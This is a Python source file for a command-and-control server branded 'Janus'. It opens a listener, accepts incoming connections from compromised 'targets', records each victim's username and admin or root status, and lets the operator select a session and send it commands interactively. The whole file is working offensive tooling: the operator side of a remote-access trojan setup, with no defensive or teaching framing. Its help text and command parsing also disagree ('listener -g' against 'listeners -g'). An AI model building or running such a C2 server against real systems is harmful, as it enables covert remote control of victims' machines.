import socket
import sys
import threading
import time
from datetime import datetime
from prettytable import PrettyTable

def banner(): 
    print('   __     ______     __   __     __  __     ______             ')
    print('  /\ \   /\  __ \   /\ "-.\ \   /\ \/\ \   /\  ___\            ')
    print(' _\_\ \  \ \  __ \  \ \ \-.  \  \ \ \_\ \  \ \___  \           ') 
    print('/\_____\  \ \_\ \_\  \ \_\ "\_\  \ \_____\  \/\_____\          ')
    print('\/_____/   \/_/\/_/   \/_/ \/_/   \/_____/   \/_____/  by  rg\n')

#C2 Server Help
def helpfile():
    print ('\n')
    print ('Usage:\n')
    print ('LISTENER')
    print ('listener -g' + ' ' * 22 + 'INPUT IP AND PORT FOR SOCKET\n')
    print ('SESSIONS')  
    print ('sessions -l' + ' ' * 22 + 'LIST ACTIVE SESSIONS')
    print ('sessions -i [session number]' + ' ' * 5 + 'CONNECT TO SESSION')
    print ('\n')
                                                      
#Function to Handle Incoming Messages
def comm_in(targ_id):
     print('[+] Awaiting response...')
     response = targ_id.recv(1024).decode()
     return response

#Function to Handle Outgoing Messages
def comm_out(targ_id, message):
    message = str(message)
    targ_id.send(message.encode())

def target_comm(targ_id):
    while True:
        message = input('Send Message > ')
        comm_out(targ_id, message)
        if message == 'exit':
            targ_id.send(message.encode())
            targ_id.close()
            break
        if message == 'background' or message == 'bg':
            break
        else:
            response = comm_in(targ_id)
            if response == 'exit':
                print(f'[!] {targ_id} has terminated the session.')
                targ_id.close()
                break
            print(response)

#Listener Handler Function
def listener_handler():
    sock.bind((host_ip, int(host_port)))
    print('[+] Server ready for client connection(s)...\n')
    sock.listen()
    t1 = threading.Thread(target=comm_handler)
    t1.start()

#Communication Handler Function
def comm_handler():
    while True:
        if kill_flag == 1:
            break
        try:
            remote_target, remote_ip = sock.accept()
            username = remote_target.recv(1024).decode()
            admin = remote_target.recv(1024).decode()
            if admin == 1:
                admin_val = 'Yes'
            elif username == 'root':
                admin_val = 'Yes'
            else:
                admin_val = 'No'
            cur_time = time.strftime("%H:%M:%S", time.localtime())
            date = datetime.now()
            time_record = (f"{date.month}/{date.day}/{date.year} {cur_time}")
            host_name = socket.gethostbyaddr(remote_ip[0])
            if host_name is not None:
                targets.append([remote_target, f"{host_name[0]}@{remote_ip[0]}", time_record, username, admin_val])
                print(f'\n[+] Connection received from {host_name[0]}@{remote_ip[0]}\n' + 'Command > ', end="")
            else:
                targets.append([remote_target, remote_ip[0], time_record])
                print(f'\n[+] Connection received from {remote_ip[0]}\n' + 'Command > ', end="")
        except:
            pass

#Main
if __name__ == '__main__':
    targets = []
    banner()
    kill_flag = 0
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try:
            command = input('Command > ')
            if command == 'help' or command == '-h':
                helpfile()
            if command == 'listeners -g':
                host_ip = input('Enter the IP to list on: ')
                host_port  = input('Enter the port to listen on: ')
                listener_handler()
            if command.split(" ")[0] == 'sessions': 
                session_counter = 0
                if command.split(" ")[1] == '-l':
                    myTable = PrettyTable()
                    myTable.field_names = ['Session', 'Status', 'Username', 'Admin', 'Target', 'Session Start Time']
                    myTable.padding_width = 3
                    for target in targets:
                        myTable.add_row([session_counter, 'Placeholder', target[3], target[4], target[1], target[2]])
                        session_counter += 1
                    print (myTable)
                if command.split(" ")[1] == '-i':
                    num = int(command.split(" ")[2])
                    targ_id = (targets[num])[0]
                    target_comm(targ_id)
        except KeyboardInterrupt:
            print('\n[!] Keyboard interrupt issued.')
            kill_flag = 1
            sock.close()
            break